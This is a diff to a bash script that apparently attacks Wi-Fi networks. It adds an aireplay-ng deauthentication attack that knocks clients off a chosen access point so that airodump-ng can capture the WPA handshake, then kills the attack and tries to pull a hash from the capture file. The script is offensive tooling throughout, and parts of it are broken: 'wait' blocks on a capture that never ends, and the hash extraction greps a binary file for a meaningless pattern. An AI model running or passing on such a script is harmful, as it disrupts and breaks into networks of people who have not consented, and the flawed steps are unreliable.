@@ -39,11 +39,19 @@ echo "Select an access point:"
 PS3='> '
 while IFS= read -r line; do echo "$line"; done <<< "$aps" | select ap; do
     if [ -n "$ap" ]; then
-        bssid=$(echo "$ap" | awk '{print $1}')
-        channel=$(echo "$ap" | awk '{print $2}')
+        bssid_tmp=$(echo "$ap" | awk '{print $1}')
+        channel_tmp=$(echo "$ap" | awk '{print $2}')
         break
     fi
 done
+
+# Set bssid and channel variables
+bssid="$bssid_tmp"
+channel="$channel_tmp"
+
+# Perform deauthentication attack to capture handshake
+echo "Performing deauthentication attack on $bssid (channel $channel)..."
+aireplay-ng --deauth 10 -a "$bssid" mon0 &
 
 # Start capturing handshakes for target network
 echo "Capturing handshakes for $bssid (channel $channel)..."
@@ -51,6 +59,9 @@ airodump-ng -c "$channel" --bssid "$bssid" -w handshake mon0 &
 
 # Wait for handshake capture to complete
 wait
+
+# Stop deauthentication attack
+pkill aireplay-ng
 
 # Extract hash from handshake file
 hash=$(grep -oP '([0-9A-Fa-f]{2}:){15}[0-9A-Fa-f]{2}' handshake-01.cap | head -n 1)
